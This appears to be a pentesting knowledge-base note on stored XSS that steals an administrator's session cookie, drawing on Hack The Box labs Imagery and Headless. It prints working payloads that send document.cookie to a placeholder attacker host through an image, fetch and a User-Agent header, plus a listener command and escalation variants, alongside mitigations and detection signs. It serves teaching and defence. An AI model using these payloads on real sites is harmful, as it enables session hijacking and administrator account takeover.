---
topic: Stored XSS — stealing the administrator cookie
tags: [web, xss, cookies, admin-bot, imagery, headless]
---

# Stored XSS — stealing the administrator cookie

[🌐 Español](stored-xss-admin-cookie.md) | **English**

## Concept

Stored XSS persists in the database and runs when someone else visits the page. If that someone is an administrator, the script can read their session cookie, send it to the attacker and allow impersonation. It is a classic chain when an admin panel reviews reports, comments or tickets.

## When it applies

- A field is stored and rendered without escaping (HTML, Markdown, attributes).
- An administrator reviews the content from the same origin.
- The session cookie is not `HttpOnly`, or sensitive actions are reachable via CSRF.
- On Imagery, the bug report `details` field rendered as HTML and the admin visited it.

## Procedure

1. Identify the stored field and check whether it is escaped.
2. Inject a payload that sends `document.cookie` to the attacker.
3. Wait for the bot/admin to visit the page.
4. Receive the cookie on the listener.
5. Replace the cookie in the browser and access the panel.

## Commands

```html
<script>new Image().src='http://<ATTACKER>/?c='+encodeURIComponent(document.cookie)</script>
```

```html
<img src=x onerror="fetch('http://<ATTACKER>/',{method:'POST',body:document.cookie})">
```

```bash
python3 -m http.server 80
```

In the browser: DevTools → Application → Cookies → replace the value and reload.

## Variants

- If `HttpOnly` is set, use the XSS to make authenticated requests (`fetch('/admin/...')`) and exfiltrate the response.
- Create an admin user or change the password via CSRF.
- Use the XSS to read CSRF tokens and automate actions.
- Store the payload in an SVG or a field rendered in the panel.

## Limitations

- `HttpOnly` prevents reading the cookie.
- `SameSite=Strict` may block cross-site requests.
- A strict CSP may block inline scripts.
- The admin may never visit the content or may use an isolated environment.

## Mitigation

- Escape output by context (HTML, attribute, JS, URL).
- Use `HttpOnly`, `Secure` and `SameSite` on session cookies.
- Implement CSP with nonces and no `unsafe-inline`.
- Sanitise HTML with an allowlist (DOMPurify) if formatting is allowed.
- Review content on an isolated domain.

## Real-world case: Headless

The `headless.htb` contact form reflects HTML and warns that request headers are forwarded for analysis. The XSS is not in the body but in `User-Agent`:

```http
User-Agent: <script>fetch('http://<ATTACKER>/?c='+document.cookie)</script>
```

When the administrator reviews the inquiry, the script runs, the cookie reaches the listener and the dashboard opens. There a diagnostic form with command injection gives the shell. The lesson is twofold: any header stored and displayed in the panel is an XSS field, and the stolen cookie can open surface with more privileges than the initial one. In *Beyond Root*, 0xdf decodes and modifies the cookie, a reminder that a session cookie readable by JavaScript is enough to escalate inside the application.

## Detection

- `<script>`, `onerror`, `onload` or `javascript:` in user fields.
- Outbound requests from the admin browser to unexpected domains.
- Cookies used from different IPs or user-agents.
- Session changes right after visiting reported content.

## References

- [OWASP — Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)
- [OWASP — XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [0xdf — Imagery](https://0xdf.gitlab.io/2025/02/08/htb-imagery.html)
- [Imagery writeup](../../machines/linux/imagery/README.en.md)
